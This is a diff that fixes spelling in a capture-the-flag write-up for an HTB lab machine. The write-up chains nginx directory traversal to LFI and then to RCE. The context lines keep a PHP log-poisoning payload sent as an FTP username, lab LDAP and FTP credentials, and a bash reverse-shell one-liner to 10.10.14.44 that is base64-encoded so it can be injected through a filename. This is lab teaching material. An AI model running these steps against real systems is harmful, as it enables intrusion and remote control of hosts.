@@ -32,7 +32,7 @@ From web server's DIRECTORY TRAVERSAL to LFI to RCE.
 
 ## URL parser logic(directory traversal) in nginx
 
-`/admin` uses http basic authentication but the error looks intresting
+`/admin` uses http basic authentication but the error looks interesting
 
 ![](screenshots/admin-on-81.png)
 
@@ -100,7 +100,7 @@ From nmap scan, ftp service is listening on port 21
 
 FTP server logs are stored in `/var/log/vsftpd.log`. If you have a LFI and can access a exposed vsftpd server, you could try to login **setting the PHP payload in the username and then access the logs using the LFI.**
 
-use php code as usename
+use php code as username
 ```bash
 '<?php phpinfo(); ?>'
 ```
@@ -228,7 +228,7 @@ ldapsearch -x -h 127.0.0.1 -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w 'J~42%
 
 ftp user creds: `pwnmeow:_G0tT4_C4tcH_'3m_4lL!_`
 
-Create a file with reverse shell as it's name in the local direcotry.
+Create a file with reverse shell as it's name in the local directory.
 
 ```bash
 ❯ echo 'bash  -i  >&  /dev/tcp/10.10.14.44/4141  0>&1  ' | base64 -w 0
